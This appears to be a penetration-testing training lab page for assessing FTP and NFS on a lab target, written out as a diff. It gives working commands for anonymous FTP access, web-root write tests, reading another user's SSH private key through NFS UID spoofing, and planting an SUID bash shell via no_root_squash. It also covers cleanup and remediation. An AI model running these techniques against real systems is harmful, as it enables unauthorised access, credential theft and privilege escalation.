@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab F3-A: FTP and NFS Assessment</title>
+  <style>
+    :root {
+      --bg: #0f1117;
+      --surface: #1a1d27;
+      --surface2: #22263a;
+      --border: #2e3350;
+      --accent: #4f8ef7;
+      --accent2: #7c5af7;
+      --green: #3dd68c;
+      --yellow: #f5c842;
+      --red: #f75a5a;
+      --text: #e2e6f0;
+      --text2: #8b92b3;
+      --code-bg: #12141e;
+      --radius: 8px;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 15px; line-height: 1.65; }
+
+    header { background: var(--surface); border-bottom: 1px solid var(--border); padding: 18px 28px; display: flex; align-items: center; gap: 14px; }
+    header .badge { background: var(--accent2); color: #fff; font-size: 11px; font-weight: 700; padding: 3px 9px; border-radius: 20px; letter-spacing: 0.5px; }
+    header h1 { font-size: 18px; font-weight: 700; }
+    header .meta { font-size: 12px; color: var(--text2); margin-left: auto; }
+
+    .progress-bar { height: 3px; background: var(--border); }
+    .progress-bar .fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent2)); width: 0%; transition: width 0.4s; }
+
+    main { max-width: 900px; margin: 0 auto; padding: 32px 24px 80px; }
+
+    .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 28px; }
+    .info-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 14px 18px; }
+    .info-card .label { font-size: 11px; color: var(--text2); text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 4px; }
+    .info-card .value { font-size: 14px; font-weight: 600; }
+
+    .objectives { background: var(--surface); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: var(--radius); padding: 18px 22px; margin-bottom: 28px; }
+    .objectives h3 { font-size: 13px; text-transform: uppercase; letter-spacing: 0.6px; color: var(--accent); margin-bottom: 10px; }
+    .objectives ul { list-style: none; padding: 0; }
+    .objectives ul li { padding: 4px 0; padding-left: 18px; position: relative; }
+    .objectives ul li::before { content: "->"; position: absolute; left: 0; color: var(--accent); font-size: 11px; top: 7px; }
+
+    .step { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 16px; overflow: hidden; transition: border-color 0.2s; }
+    .step.active { border-color: var(--accent); }
+    .step.done { border-color: var(--green); }
+
+    .step-header { display: flex; align-items: center; gap: 14px; padding: 16px 20px; cursor: pointer; user-select: none; }
+    .step-num { width: 28px; height: 28px; border-radius: 50%; background: var(--border); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; flex-shrink: 0; }
+    .step.active .step-num { background: var(--accent); }
+    .step.done .step-num { background: var(--green); color: #000; }
+    .step-title { font-weight: 600; font-size: 15px; flex: 1; }
+    .step-toggle { color: var(--text2); font-size: 18px; transition: transform 0.2s; }
+    .step.open .step-toggle { transform: rotate(180deg); }
+
+    .step-body { display: none; padding: 0 20px 20px; border-top: 1px solid var(--border); }
+    .step.open .step-body { display: block; }
+
+    .step-body p { margin-top: 14px; }
+    .step-body h4 { margin-top: 18px; margin-bottom: 8px; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text2); }
+
+    pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 14px 16px; margin-top: 10px; overflow-x: auto; font-family: 'Consolas', 'Fira Code', monospace; font-size: 13px; line-height: 1.6; position: relative; }
+    .copy-btn { position: absolute; top: 8px; right: 8px; background: var(--surface2); border: 1px solid var(--border); color: var(--text2); border-radius: 4px; padding: 3px 9px; font-size: 11px; cursor: pointer; transition: all 0.2s; }
+    .copy-btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+
+    .callout { border-radius: 6px; padding: 12px 16px; margin-top: 14px; font-size: 14px; }
+    .callout.info { background: rgba(79,142,247,0.1); border-left: 3px solid var(--accent); }
+    .callout.warn { background: rgba(245,200,66,0.1); border-left: 3px solid var(--yellow); }
+    .callout.success { background: rgba(61,214,140,0.1); border-left: 3px solid var(--green); }
+    .callout.danger { background: rgba(247,90,90,0.1); border-left: 3px solid var(--red); }
+
+    table { width: 100%; border-collapse: collapse; margin-top: 12px; font-size: 13px; }
+    th { background: var(--surface2); color: var(--text2); text-align: left; padding: 8px 12px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.4px; }
+    td { border-top: 1px solid var(--border); padding: 9px 12px; }
+
+    .confirm-block { margin-top: 16px; background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; padding: 14px 16px; }
+    .confirm-block p { font-size: 13px; margin-bottom: 10px; }
+    .confirm-block label { display: flex; align-items: flex-start; gap: 10px; font-size: 13px; cursor: pointer; margin-bottom: 6px; }
+    .confirm-block input[type="checkbox"] { margin-top: 3px; accent-color: var(--green); }
+
+    .complete-btn { display: block; width: 100%; margin-top: 12px; padding: 12px; background: var(--green); color: #000; font-weight: 700; font-size: 14px; border: none; border-radius: var(--radius); cursor: pointer; transition: opacity 0.2s; }
+    .complete-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+    .complete-btn:not(:disabled):hover { opacity: 0.85; }
+
+    .lab-complete { text-align: center; padding: 40px 20px; display: none; }
+    .lab-complete .icon { font-size: 48px; margin-bottom: 12px; }
+    .lab-complete h2 { font-size: 22px; margin-bottom: 8px; color: var(--green); }
+    .lab-complete p { color: var(--text2); }
+
+    .tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; margin-right: 4px; }
+    .tag.critical { background: rgba(247,90,90,0.2); color: var(--red); }
+    .tag.high { background: rgba(245,200,66,0.2); color: var(--yellow); }
+    .tag.medium { background: rgba(79,142,247,0.2); color: var(--accent); }
+    .tag.info { background: rgba(139,146,179,0.2); color: var(--text2); }
+
+    .section-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--accent2); margin: 30px 0 10px; }
+  </style>
+</head>
+<body>
+
+<header>
+  <span class="badge">CPSA</span>
+  <h1>Lab F3-A: FTP and NFS Assessment</h1>
+  <span class="meta">Module F &nbsp;|&nbsp; Linux / Unix Security Assessment</span>
+</header>
+<div class="progress-bar"><div class="fill" id="progress"></div></div>
+
+<main>
+
+  <div class="info-grid">
+    <div class="info-card"><div class="label">Target</div><div class="value">SYNTEX-LNX01</div></div>
+    <div class="info-card"><div class="label">Duration</div><div class="value">35-40 min</div></div>
+    <div class="info-card"><div class="label">Difficulty</div><div class="value">Intermediate</div></div>
+    <div class="info-card"><div class="label">Syllabus</div><div class="value">F3 / F5</div></div>
+  </div>
+
+  <div class="objectives">
+    <h3>Lab Objectives</h3>
+    <ul>
+      <li>Identify FTP version and test for anonymous access on SYNTEX-LNX01</li>
+      <li>Test FTP write permissions and assess webshell upload risk</li>
+      <li>Enumerate NFS exports using showmount and rpcinfo</li>
+      <li>Demonstrate UID/GID matching to bypass NFS file-level security</li>
+      <li>Classify and document findings to CPSA report standard</li>
+    </ul>
+  </div>
+
+  <div id="steps-container">
+
+    <div class="section-label">Part 1 - FTP Assessment</div>
+
+    <!-- Step 1 -->
+    <div class="step open active" data-step="1">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-num">1</div>
+        <div class="step-title">FTP Identification and Banner Grab</div>
+        <span class="step-toggle">&#x25BE;</span>
+      </div>
+      <div class="step-body">
+        <p>Port 21 FTP. Grab the banner and run nmap service scripts to get the daemon version before authenticating.</p>
+
+        <h4>Commands</h4>
+        <pre><code>nc -vn 10.10.10.50 21
+# Banner reveals daemon name and version
+
+nmap -sV -p 21 --script ftp-syst 10.10.10.50
+nmap -p 21 --script ftp-anon 10.10.10.50</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <h4>ftp-syst Output</h4>
+        <p>The SYST command reveals the operating system and FTP daemon flavour. Record this version string - it feeds into vulnerability research in F2.</p>
+
+        <div class="callout info">Nmap ftp-anon tests anonymous login automatically. A "+" in the script output means anonymous access is permitted.</div>
+
+        <div class="confirm-block">
+          <label><input type="checkbox" onchange="checkStep(1)"> Banner grabbed and daemon version recorded</label>
+          <label><input type="checkbox" onchange="checkStep(1)"> ftp-anon nmap result recorded (permitted / denied)</label>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="step" data-step="2">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-num">2</div>
+        <div class="step-title">Anonymous FTP Login and Directory Enumeration</div>
+        <span class="step-toggle">&#x25BE;</span>
+      </div>
+      <div class="step-body">
+        <p>Connect with the anonymous account and enumerate what is accessible. Any file in the FTP root is exposed to the entire network.</p>
+
+        <h4>Connection</h4>
+        <pre><code>ftp 10.10.10.50
+# Username: anonymous
+# Password: (blank or any@email)
+
+ftp> ls -la
+ftp> pwd
+ftp> ls -laR    # Recursive - careful on large shares</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <h4>What to Look For</h4>
+        <table>
+          <tr><th>Finding</th><th>Severity</th></tr>
+          <tr><td>Configuration files (.conf, .ini, .env)</td><td><span class="tag high">High</span></td></tr>
+          <tr><td>Backup files (.bak, .old, .tar.gz)</td><td><span class="tag high">High</span></td></tr>
+          <tr><td>Scripts with credentials hardcoded</td><td><span class="tag critical">Critical</span></td></tr>
+          <tr><td>World-readable /etc directory symlinked</td><td><span class="tag critical">Critical</span></td></tr>
+          <tr><td>Empty / no files - access confirmed only</td><td><span class="tag medium">Medium</span></td></tr>
+        </table>
+
+        <h4>Download Interesting Files</h4>
+        <pre><code>ftp> get interesting-file.txt
+ftp> mget *.conf</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <div class="callout danger">Never run mget * on an unknown FTP share without listing contents first. Exfiltrating client data you are not authorised to take violates rules of engagement.</div>
+
+        <div class="confirm-block">
+          <label><input type="checkbox" onchange="checkStep(2)"> Directory listing saved (ls -la output)</label>
+          <label><input type="checkbox" onchange="checkStep(2)"> Interesting files noted and downloaded where authorised</label>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <div class="step" data-step="3">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-num">3</div>
+        <div class="step-title">FTP Write Access Test</div>
+        <span class="step-toggle">&#x25BE;</span>
+      </div>
+      <div class="step-body">
+        <p>Write access to the FTP root is a significant escalation. If the FTP root overlaps with the web root, write access enables webshell upload and remote code execution.</p>
+
+        <h4>Write Test</h4>
+        <pre><code># Create a harmless test file locally first
+echo "PENTEST-WRITE-TEST $(date)" > write-test.txt
+
+ftp> put write-test.txt
+# 226 Transfer complete = write permitted
+# 550 Permission denied = write blocked</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <h4>Check Web Root Overlap</h4>
+        <pre><code># After write test, check if file appears via HTTP
+curl -s http://10.10.10.50/write-test.txt
+# 200 OK = FTP root IS the web root (Critical finding)
+# 404 = FTP root does not overlap with web root</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <h4>Clean Up - Mandatory</h4>
+        <pre><code>ftp> delete write-test.txt
+# Confirm deletion before disconnecting
+ftp> ls write-test.txt    # Should return no such file</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <div class="callout danger">Remove write-test.txt immediately after confirming the finding. Leaving test artefacts on client systems is a reversion failure and will be raised in the debrief.</div>
+
+        <div class="callout success">Anonymous FTP + write access + web root overlap = Critical standalone finding. Document with before/after screenshots and the curl HTTP 200 response as a chain of evidence.</div>
+
+        <div class="confirm-block">
+          <label><input type="checkbox" onchange="checkStep(3)"> Write test performed and result recorded</label>
+          <label><input type="checkbox" onchange="checkStep(3)"> Web root overlap tested (curl HTTP response)</label>
+          <label><input type="checkbox" onchange="checkStep(3)"> write-test.txt deleted and deletion confirmed</label>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-label">Part 2 - NFS Assessment</div>
+
+    <!-- Step 4 -->
+    <div class="step" data-step="4">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-num">4</div>
+        <div class="step-title">NFS Export Enumeration</div>
+        <span class="step-toggle">&#x25BE;</span>
+      </div>
+      <div class="step-body">
+        <p>NFS runs over RPC. Identify available exports using showmount, then cross-reference with rpcinfo to confirm the service map.</p>
+
+        <h4>Commands</h4>
+        <pre><code># List NFS exports
+showmount -e 10.10.10.50
+
+# RPC service map - confirms NFS version and portmapper
+rpcinfo -p 10.10.10.50
+
+# Nmap NFS scripts
+nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.50</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <h4>Interpreting showmount Output</h4>
+        <table>
+          <tr><th>Export Line</th><th>Risk</th></tr>
+          <tr><td>/home *</td><td><span class="tag critical">Critical</span> - world-mountable home dirs</td></tr>
+          <tr><td>/var/backups 10.10.10.0/24</td><td><span class="tag high">High</span> - subnet-wide access to backups</td></tr>
+          <tr><td>/data trusted-host</td><td><span class="tag medium">Medium</span> - host-restricted, check that host's security</td></tr>
+        </table>
+
+        <div class="callout warn">Asterisk (*) in the client list means any host on the internet can mount the share. This is always at minimum a High finding regardless of what the export contains.</div>
+
+        <div class="confirm-block">
+          <label><input type="checkbox" onchange="checkStep(4)"> showmount -e output recorded</label>
+          <label><input type="checkbox" onchange="checkStep(4)"> rpcinfo port list saved</label>
+          <label><input type="checkbox" onchange="checkStep(4)"> Export permissions (client restrictions) noted per share</label>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 5 -->
+    <div class="step" data-step="5">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-num">5</div>
+        <div class="step-title">Mount NFS Share and Test UID/GID Access</div>
+        <span class="step-toggle">&#x25BE;</span>
+      </div>
+      <div class="step-body">
+        <p>Mount a world-accessible export. NFS relies on the client's UID/GID for file-level access control. Creating a local user matching a target UID bypasses this entirely.</p>
+
+        <h4>Mount the Share</h4>
+        <pre><code>mkdir /tmp/nfs-mount
+mount -t nfs 10.10.10.50:/home /tmp/nfs-mount -nolock
+
+# List contents
+ls -lan /tmp/nfs-mount
+# -lan shows numeric UIDs and GIDs</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <h4>UID Matching Attack</h4>
+        <pre><code># Identify a file owned by UID 1103
+ls -lan /tmp/nfs-mount/
+# -rw------- 1 1103 1103 1024 Oct 21 /tmp/nfs-mount/jsmith/id_rsa
+
+# Create a matching local user
+useradd -u 1103 syntex-match
+
+# Switch to that user and read the file
+su syntex-match
+cat /tmp/nfs-mount/jsmith/id_rsa
+# Access granted - UID matched</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <h4>Check for no_root_squash</h4>
+        <pre><code># If running as root, attempt to access root-owned files
+ls /tmp/nfs-mount/root/ 2>/dev/null
+# If successful: no_root_squash is set (Critical)
+
+# Try creating an SUID shell (lab demonstration only)
+cp /bin/bash /tmp/nfs-mount/bash-suid
+chmod +s /tmp/nfs-mount/bash-suid
+ls -la /tmp/nfs-mount/bash-suid
+# -rwsr-xr-x = SUID bit set, no_root_squash confirmed Critical</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <div class="callout danger">If you create an SUID binary during this demonstration, delete it immediately: rm /tmp/nfs-mount/bash-suid. Leaving SUID binaries on client infrastructure is a reversion failure.</div>
+
+        <h4>Reversion</h4>
+        <pre><code>umount /tmp/nfs-mount
+rm -rf /tmp/nfs-mount
+userdel syntex-match</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <div class="confirm-block">
+          <label><input type="checkbox" onchange="checkStep(5)"> NFS share mounted and ls -lan output recorded</label>
+          <label><input type="checkbox" onchange="checkStep(5)"> UID/GID matching demonstrated (or documented as not tested)</label>
+          <label><input type="checkbox" onchange="checkStep(5)"> no_root_squash status recorded</label>
+          <label><input type="checkbox" onchange="checkStep(5)"> Share unmounted and test user deleted</label>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 6 -->
+    <div class="step" data-step="6">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-num">6</div>
+        <div class="step-title">Compile Findings - FTP and NFS</div>
+        <span class="step-toggle">&#x25BE;</span>
+      </div>
+      <div class="step-body">
+        <p>Document both FTP and NFS findings in CPSA format. Each has its own title, evidence chain, and remediation recommendation.</p>
+
+        <h4>Finding Summary Table</h4>
+        <table>
+          <tr><th>Finding</th><th>Severity</th><th>Evidence Required</th></tr>
+          <tr><td>Anonymous FTP access</td><td><span class="tag high">High</span></td><td>ftp-anon nmap output + directory listing</td></tr>
+          <tr><td>FTP write access to web root</td><td><span class="tag critical">Critical</span></td><td>PUT test + curl HTTP 200 confirming overlap</td></tr>
+          <tr><td>NFS world-mountable share</td><td><span class="tag high">High</span></td><td>showmount -e showing * client list</td></tr>
+          <tr><td>NFS no_root_squash</td><td><span class="tag critical">Critical</span></td><td>SUID binary creation confirmed, ls -la evidence</td></tr>
+          <tr><td>NFS UID spoofing access</td><td><span class="tag high">High</span></td><td>useradd + su + file read demonstrating bypass</td></tr>
+        </table>
+
+        <h4>Remediation Template - NFS</h4>
+        <pre><code># /etc/exports - Recommended configuration
+# Replace:
+# /home *
+# With:
+/home  trusted-host.syntex.local(ro,root_squash,nosuid,noexec)
+
+# Verify:
+exportfs -ra
+showmount -e localhost</code><button class="copy-btn" onclick="copyCode(this)">Copy</button></pre>
+
+        <div class="callout success">Operator Takeaway: Anonymous FTP and world-mountable NFS are both common on legacy Linux infrastructure. Finding both on the same host creates a multi-vector attack path: FTP for initial file read, NFS for privilege escalation if no_root_squash is set.</div>
+
+        <div class="confirm-block">
+          <p>Lab completion checklist:</p>
+          <label><input type="checkbox" onchange="checkStep(6)"> FTP finding documented with severity and evidence chain</label>
+          <label><input type="checkbox" onchange="checkStep(6)"> NFS finding documented with severity and evidence chain</label>
+          <label><input type="checkbox" onchange="checkStep(6)"> Reversion confirmed for all test artefacts</label>
+          <label><input type="checkbox" onchange="checkStep(6)"> Recommendations written in specific actionable form</label>
+          <button class="complete-btn" id="complete-btn-6" disabled onclick="completeLab()">Mark Lab Complete</button>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /steps-container -->
+
+  <div class="lab-complete" id="lab-complete">
+    <div class="icon">&#x2705;</div>
+    <h2>Lab F3-A Complete</h2>
+    <p>FTP and NFS Assessment documented. Proceed to Lab F4-A (SSH and Post-Exploitation).</p>
+  </div>
+
+</main>
+
+<script>
+  const TOTAL_STEPS = 6;
+  const stepChecks = {};
+
+  function toggleStep(header) {
+    const step = header.parentElement;
+    step.classList.toggle('open');
+  }
+
+  function checkStep(stepNum) {
+    const step = document.querySelector(`[data-step="${stepNum}"]`);
+    const boxes = step.querySelectorAll('input[type="checkbox"]');
+    const all = Array.from(boxes).every(b => b.checked);
+    if (all) {
+      step.classList.add('done');
+      stepChecks[stepNum] = true;
+    } else {
+      step.classList.remove('done');
+      delete stepChecks[stepNum];
+    }
+    updateProgress();
+
+    const completeBtn = document.getElementById(`complete-btn-${stepNum}`);
+    if (completeBtn) completeBtn.disabled = !all;
+  }
+
+  function updateProgress() {
+    const done = Object.keys(stepChecks).length;
+    const pct = Math.round((done / TOTAL_STEPS) * 100);
+    document.getElementById('progress').style.width = pct + '%';
+  }
+
+  function completeLab() {
+    document.getElementById('steps-container').style.display = 'none';
+    document.getElementById('lab-complete').style.display = 'block';
+    document.getElementById('progress').style.width = '100%';
+  }
+
+  function copyCode(btn) {
+    const code = btn.previousSibling.textContent;
+    navigator.clipboard.writeText(code.trim()).then(() => {
+      btn.textContent = 'Copied!';
+      setTimeout(() => btn.textContent = 'Copy', 1500);
+    });
+  }
+</script>
+</body>
+</html>
